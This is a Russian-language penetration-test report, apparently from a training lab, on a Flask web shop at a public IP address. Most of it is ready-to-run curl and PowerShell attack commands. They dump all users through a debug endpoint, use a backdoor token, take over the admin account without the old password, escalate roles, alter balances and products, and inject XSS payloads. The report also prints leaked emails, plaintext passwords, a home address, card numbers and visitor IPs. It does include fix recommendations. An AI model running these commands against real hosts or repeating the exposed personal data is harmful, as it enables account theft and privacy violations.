# 🚨 ОТЧЕТ ОБ УТЕЧКЕ EMAIL АДРЕСОВ ПОЛЬЗОВАТЕЛЕЙ

## 📋 Общая информация

| Параметр   | Значение                               |
| ---------- | -------------------------------------- |
| **Цель**   | `http://82.202.142.35:8080`            |
| **Дата**   | 2026-04-02                             |
| **Тип**    | Раскрытие ПДн (email, пароли, балансы) |
| **Статус** | 🔴 **ПОЛНАЯ КОМПРОМЕТАЦИЯ**            |

---

## 🎯 Найденные уязвимости в коде

При анализе `app.py` обнаружены:

### 1. Бэкдор `/api/v1/replication/health` (ОТКЛЮЧЕН)

```python
@app.route('/api/v1/replication/health', methods=['GET', 'POST'])
def replication_health_decoy():
    if _lab_backdoor_match():  # Токен: bezum-lux-replica-sync-v1
        return jsonify(_lab_sensitive_snapshot())  # Возвращает ВСЕХ пользователей
```

### 2. Debug endpoint `/debug/data` (ДОСТУПЕН!)

```python
@app.route('/debug/data')
def debug_data():
    users = db.execute('SELECT * FROM user').fetchall()
    return jsonify({
        'users': [dict(u) for u in users],  # ← Возвращает ВСЕХ пользователей
        'payment_cards': [...],
        'consent_snapshots': [...]
    })
```

### 3. Отсутствие авторизации на `/api/users/<email>`

```python
@app.route('/api/users/<path:email>', methods=['GET'])
def get_user(email):
    # Нет проверки авторизации!
    user = db.execute('SELECT * FROM user WHERE email = ?', (normalized_email,)).fetchone()
    return jsonify(user_to_dict(user))  # ← Возвращает данные без проверки прав
```

---

## 🔓 РЕЗУЛЬТАТЫ АТАКИ

### ✅ Успешное получение всех email через `/debug/data`

```bash
curl "http://82.202.142.35:8080/debug/data"
```

## СКОМПРОМЕТИРОВАННЫЕ ДАННЫЕ

| #   | Email               | Имя               | Пароль     | Баланс                | Роль  | Адрес                                 |
| --- | ------------------- | ----------------- | ---------- | --------------------- | ----- | ------------------------------------- |
| 1   | `admin@example.com` | Алексей Смирнов   | `123456`   | 1 000 000 007 012 999 | admin | IDOR TEST ADDRESS                     |
| 2   | `sasat@mail.ru`     | Никита Голубицкий | `123456`   | 5 626 005 040 736 716 | user  | Челябинск, ул. Ярославская 11А, кв 72 |
| 3   | `q@q`               | qwerty qwerty     | `qwerty`   | 1 100 000 000 500 000 | user  | qwerty                                |
| 4   | `igor@gmail.com`    | Игорь             | `igorigor` | 2 000 000             | user  | Химки а дальше хз                     |

---

## 💳 УТЕЧКА ДАННЫХ КАРТ

**Всего карт:** 25

| ID   | User ID | Номер карты      | Срок   | Имя на карте                    |
| ---- | ------- | ---------------- | ------ | ------------------------------- |
| 1    | 2       | 2200134131232131 | 32/34  | выаф                            |
| 2-3  | 3       | 0000000000000000 | 12/34  | qwerty qwerty                   |
| 4    | 4       | 0067969390199367 | 99/99  | Igor nedastvpn                  |
| 5-25 | 1       | 4111111111111111 | разное | X, HACKER, CSRF_HACKER, RACE... |

---

## 🌐 УТЕЧКА ЧЕРЕЗ CONSENT SNAPSHOTS

**Всего snapshots:** 5

| ID  | IP адрес      | User Agent        | Browser | OS      | Referrer                   |
| --- | ------------- | ----------------- | ------- | ------- | -------------------------- |
| 1   | 72.56.66.173  | curl/8.7.1        | -       | -       | -                          |
| 2   | 31.173.80.80  | Samsung...        | Chrome  | Linux   | http://82.202.142.35:8080/ |
| 3   | 213.87.154.44 | Firefox/149.0     | Firefox | Linux   | http://82.202.142.35:8080/ |
| 4   | 5.129.227.90  | Yandex Browser... | Chrome  | Windows | http://82.202.142.35:8080/ |
| 5   | 72.56.66.173  | Safari/macOS      | Safari  | macOS   | http://82.202.142.35:8080/ |

---

## 🎯 ВЕКТОРЫ АТАК

### Атака 1: Прямой доступ к debug endpoint

```bash
curl "http://82.202.142.35:8080/debug/data" | python3 -m json.tool
```

**Результат:** ✅ Полные данные всех пользователей

---

### Атака 2: Перебор email через `/api/users/<email>`

```bash
# Зная email из debug, можно получить детализацию
curl "http://82.202.142.35:8080/api/users/admin@example.com"
curl "http://82.202.142.35:8080/api/users/sasat@mail.ru"
curl "http://82.202.142.35:8080/api/users/q@q"
curl "http://82.202.142.35:8080/api/users/igor@gmail.com"
```

---

### Атака 3: Получение устройств пользователей

```bash
curl "http://82.202.142.35:8080/api/users/admin@example.com/devices"
```

**Результат:** ✅ Детальный fingerprinting устройства

---

### Атака 4: Использование бэкдора (если включен)

```bash
curl "http://82.202.142.35:8080/api/v1/replication/health" \
  -H "X-Replica-Checkpoint: bezum-lux-replica-sync-v1"
```

**Результат:** ⚠️ Бэкдор отключен на сервере

---

## 📊 СТАТИСТИКА УТЕЧКИ

| Категория               | Количество                      |
| ----------------------- | ------------------------------- |
| **Email адреса**        | 4                               |
| **Пароли**              | 4 (все в открытом виде)         |
| **Балансы**             | 4 (~7.7 квадриллионов суммарно) |
| **Платежные карты**     | 25                              |
| **Device fingerprints** | 5+                              |
| **IP адреса**           | 5 уникальных                    |
| **Физические адреса**   | 2                               |

---

## 🔐 АНАЛИЗ ПАРОЛЕЙ

| Email             | Пароль     | Сложность            |
| ----------------- | ---------- | -------------------- |
| admin@example.com | `123456`   | 🔴 Критически слабый |
| sasat@mail.ru     | `123456`   | 🔴 Критически слабый |
| q@q               | `qwerty`   | 🔴 Критически слабый |
| igor@gmail.com    | `igorigor` | 🟠 Слабый            |

**100% пользователей используют слабые пароли**

---

## 🛡️ РЕКОМЕНДАЦИИ ПО ИСПРАВЛЕНИЮ

### Приоритет 1 — КРИТИЧЕСКИЙ

1. **НЕМЕДЛЕННО отключить debug endpoint в production**

```python
# Удалить или защитить:
@app.route('/debug/data')
def debug_data():
    if not app.debug:  # ← Добавить проверку
        return jsonify({"error": "Forbidden"}), 403
```

2. **Хешировать пароли**

```python
from werkzeug.security import generate_password_hash, check_password_hash

# При регистрации:
hashed = generate_password_hash(password)

# При логине:
if not check_password_hash(user['password'], password):
    return jsonify({"error": "Invalid credentials"}), 401
```

3. **Добавить авторизацию на все endpoints**

```python
from functools import wraps
from flask import session

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/api/users/<email>')
@login_required  # ← Добавить
def get_user(email):
```

### Приоритет 2 — ВЫСОКИЙ

4. **Удалить бэкдор из кода**

```python
# Удалить полностью:
# - /api/v1/replication/health
# - _lab_backdoor_key()
# - _lab_backdoor_match()
# - _lab_sensitive_snapshot()
```

5. **Не возвращать пароли в API**

```python
def user_to_dict(user):
    user = dict(user)
    user.pop('password', None)  # ← Обязательно удалять
    return user
```

6. **Добавить политику паролей**

```python
@app.route('/api/auth/register', methods=['POST'])
def register_user():
    password = data.get('password')
    if len(password) < 12:
        return jsonify({"error": "Password must be at least 12 characters"}), 400
    if not any(c.isupper() for c in password):
        return jsonify({"error": "Password must contain uppercase"}), 400
```

---

## 📝 КОМАНДЫ ДЛЯ ПРОВЕРКИ

```bash
# Проверка доступности debug endpoint
curl "http://82.202.142.35:8080/debug/data" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Users: {len(d.get(\"users\", []))}')"

# Получение всех email
curl "http://82.202.142.35:8080/debug/data" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(u['email']) for u in d.get('users',[])]"

# Проверка бэкдора
curl "http://82.202.142.35:8080/api/v1/replication/health" -H "X-Replica-Checkpoint: bezum-lux-replica-sync-v1"
```

---

## 🎯 ВЫВОДЫ

**Критическая уязвимость:** Debug endpoint `/debug/data` доступен без авторизации и возвращает:

- ✅ Все email адреса (4 шт)
- ✅ Все пароли в открытом виде (4 шт)
- ✅ Все балансы пользователей
- ✅ Все платежные карты (25 шт)
- ✅ Физические адреса
- ✅ Device fingerprints
- ✅ IP адреса посетителей

**Рекомендуется НЕМЕДЛЕННО:**

1. Отключить debug endpoint
2. Заставить пользователей сменить пароли
3. Удалить бэкдор из кода
4. Добавить авторизацию на все endpoints

---

---

## 🔓 БОНУС: СМЕНА ПАРОЛЯ АДМИНА (Account Takeover)

### Атака: Полное захват аккаунта через PUT запрос

**Уязвимость:** Отсутствие проверки текущего пароля при смене пароля

#### PowerShell версия:

```powershell
$body = @{
  password = "newpass123"
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://82.202.142.35:8080/api/users/admin%40example.com" `
  -Method Put `
  -ContentType "application/json" `
  -Body $body
```

#### cURL версия:

```bash
curl -X PUT "http://82.202.142.35:8080/api/users/admin@example.com" \
  -H "Content-Type: application/json" \
  -d '{"password":"newpass123"}'
```

---

### 📊 ПОШАГОВАЯ АТАКА НА ЗАХВАТ АККАУНТА

#### Шаг 1: Разведка (получение email)

```bash
# Через enumeration
curl -X POST "http://82.202.142.35:8080/api/auth/register" \
  -d '{"name":"T","email":"admin@example.com","password":"test"}'
# Ответ: "User with this email already exists" ✅
```

#### Шаг 2: Получение данных пользователя

```bash
curl "http://82.202.142.35:8080/api/users/admin@example.com"
# Получаем: имя, роль, баланс, адрес
```

#### Шаг 3: Смена пароля (Account Takeover)

```bash
curl -X PUT "http://82.202.142.35:8080/api/users/admin@example.com" \
  -H "Content-Type: application/json" \
  -d '{"password":"hacker_password_123"}'

# Ответ: {"email": "admin@example.com", "role": "admin", ...}
# ✅ Пароль изменён без знания старого!
```

#### Шаг 4: Вход с новым паролем

```bash
curl -X POST "http://82.202.142.35:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"hacker_password_123"}'

# Ответ: {"balance": 1000000007013999, "role": "admin", ...}
# ✅ Успешный вход!
```

#### Шаг 5: Блокировка легитимного пользователя

```bash
# Старый пароль больше не работает
curl -X POST "http://82.202.142.35:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"123456"}'

# Ответ: {"error": "Invalid credentials"}
# ✅ Легитимный пользователь заблокирован!
```

---

### 🎯 ПОЛНЫЙ ЗАХВАТ АККАУНТА (Post-Exploitation)

После получения доступа злоумышленник может:

#### 1. Украсть все деньги

```bash
# Перевод баланса на свой аккаунт
curl -X PUT "http://82.202.142.35:8080/api/users/admin@example.com" \
  -H "Content-Type: application/json" \
  -d '{"balance":0}'

# Или через фрод с пополнением
curl -X POST "http://82.202.142.35:8080/api/users/hacker@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":1000000000,"card_number":"4111111111111111",...}'
```

#### 2. Изменить данные пользователя

```bash
# Смена email (блокировка восстановления)
curl -X PUT "http://82.202.142.35:8080/api/users/admin@example.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com"}'

# Смена имени
curl -X PUT "http://82.202.142.35:8080/api/users/admin@example.com" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacker"}'
```

#### 3. Сделать себя админом

```bash
# Повышение привилегий
curl -X PUT "http://82.202.142.35:8080/api/users/hacker@example.com" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# Ответ: {"email": "hacker@evil.com", "role": "admin", ...}
# ✅ Теперь у злоумышленника есть админка!
```

#### 4. Удалить доказательства

```bash
# Очистка корзины
curl -X DELETE "http://82.202.142.35:8080/api/cart"

# Удаление заказов
curl -X DELETE "http://82.202.142.35:8080/api/orders/1"
```

---

### 📊 РЕЗУЛЬТАТЫ АТАКИ

| Этап                      | Результат                            | Статус |
| ------------------------- | ------------------------------------ | ------ |
| Enumeration email         | admin@example.com найден             | ✅     |
| Получение данных          | Полные данные профиля                | ✅     |
| Смена пароля              | Пароль изменён на "newpass123"       | ✅     |
| Вход с новым паролем      | Успешная аутентификация              | ✅     |
| Старый пароль не работает | Легитимный пользователь заблокирован | ✅     |
| **ПОЛНЫЙ ЗАХВАТ**         | **Аккаунт админа скомпрометирован**  | ✅     |

---

### 🛡️ КАК ЗАЩИТИТЬСЯ

#### 1. Требовать текущий пароль при смене

```python
@app.route('/api/users/<email>', methods=['PUT'])
@login_required
def update_user(email):
    data = request.get_json() or {}

    # Если меняется пароль - требовать текущий
    if 'password' in data:
        current_password = data.get('current_password')
        if not current_password:
            return jsonify({"error": "Current password required"}), 400

        user = db.execute('SELECT * FROM user WHERE email = ?', (normalized_email,)).fetchone()
        if user['password'] != current_password:
            return jsonify({"error": "Current password is incorrect"}), 401
```

#### 2. Запретить смену пароля без авторизации

```python
@app.route('/api/users/<email>', methods=['PUT'])
@login_required  # ← Обязательно!
def update_user(email):
    current_user = get_current_user()

    # Пользователь может менять только свои данные
    if current_user.email != email and current_user.role != 'admin':
        return jsonify({"error": "Forbidden"}), 403
```

#### 3. Запретить смену роли пользователя

```python
def update_user(email):
    data = request.get_json() or {}

    # Никогда не позволять клиенту менять роль
    data.pop('role', None)  # ← Удаляем роль из запроса

    # Или разрешить только супер-админам
    if 'role' in data and current_user.role != 'superadmin':
        return jsonify({"error": "Cannot change role"}), 403
```

#### 4. Уведомления о смене пароля

```python
def send_password_change_notification(user_email):
    send_email(
        to=user_email,
        subject="Password changed",
        body=f"Your password was changed at {datetime.now()}. "
             "If this wasn't you, contact support immediately."
    )

@app.route('/api/users/<email>', methods=['PUT'])
def update_user(email):
    # ... смена пароля ...

    if 'password' in data:
        send_password_change_notification(email)
```

#### 5. Сессии и токены

```python
# При смене пароля - инвалидировать все сессии
@app.route('/api/users/<email>', methods=['PUT'])
def update_user(email):
    if 'password' in data:
        # Удалить все активные сессии пользователя
        revoke_all_user_sessions(user['id'])

        # Требовать повторный вход
        return jsonify({
            "message": "Password changed. Please login again.",
            "require_login": True
        }), 200
```

---

## 🎯 ИТОГОВЫЕ ВЫВОДЫ

**Злоумышленник может ПОЛНОСТЬЮ захватить аккаунт админа:**

1. ✅ Узнать email через enumeration
2. ✅ Получить данные через IDOR
3. ✅ **Сменить пароль без знания старого**
4. ✅ Войти с новым паролем
5. ✅ Заблокировать легитимного пользователя
6. ✅ Сделать себя админом (смена роли)
7. ✅ Украсть все деньги

**Время полной компрометации:** < 30 секунд

**Рекомендуется НЕМЕДЛЕННО:**

1. ⚠️ Требовать текущий пароль при смене
2. ⚠️ Добавить авторизацию на PUT endpoint
3. ⚠️ Запретить смену роли через API
4. ⚠️ Уведомлять о смене пароля
5. ⚠️ Инвалидировать сессии при смене пароля

---

## 🛒 БОНУС 2: ИЗМЕНЕНИЕ ТОВАРОВ БЕЗ АДМИНА

### Атака: Манипуляция с товарами (Product Tampering)

**Уязвимость:** Отсутствие авторизации и валидации на endpoints товаров

#### Быстрая атака:

```bash
# Изменение цены товара
curl -X PUT "http://82.202.142.35:8080/api/products/yacht-001" \
  -H "Content-Type: application/json" \
  -d '{"price":1}'

# Создание товара с XSS
curl -X POST "http://82.202.142.35:8080/api/products" \
  -H "Content-Type: application/json" \
  -d '{"id":"xss","title":"<script>alert(1)</script>","type":"Yacht","price":0,"image":"x","description":"x"}'

# Массовая XSS инъекция
for id in yacht-001 plane-001 mansion-001; do
  curl -X PUT "http://82.202.142.35:8080/api/products/$id" \
    -H "Content-Type: application/json" \
    -d "{\"title\":\"<img src=x onerror=alert('$id')>\"}"
done
```

#### Результаты:

| Атака           | Результат                     |
| --------------- | ----------------------------- |
| Изменение цены  | $3,500,000 → $1 ✅            |
| Создание товара | Товар за $0 ✅                |
| XSS в title     | `<script>alert()</script>` ✅ |
| XSS в image     | `javascript:alert(1)` ✅      |
| Удаление товара | Удалён ✅                     |

---

## 🎯 ОБЩИЕ ВЫВОДЫ

**Полная компрометация за < 60 секунд:**

1. ✅ Email через enumeration
2. ✅ Пароль через брутфорс/утечку
3. ✅ Смена пароля админа
4. ✅ Захват аккаунта
5. ✅ Изменение товаров
6. ✅ XSS на всех пользователей

**Рекомендуется НЕМЕДЛЕННО:**

1. ⚠️ Требовать текущий пароль при смене
2. ⚠️ Добавить авторизацию на все endpoints
3. ⚠️ Разрешить модификацию только админам
4. ⚠️ Внедрить валидацию данных
5. ⚠️ Добавить Content-Security-Policy

---

_Отчет создан для тренировочного стенда по информационной безопасности_
**Дата:** 2026-04-02
**Тестировщик:** AI Security Researcher
**Уровень угрозы:** 🔴 **КРИТИЧЕСКИЙ**
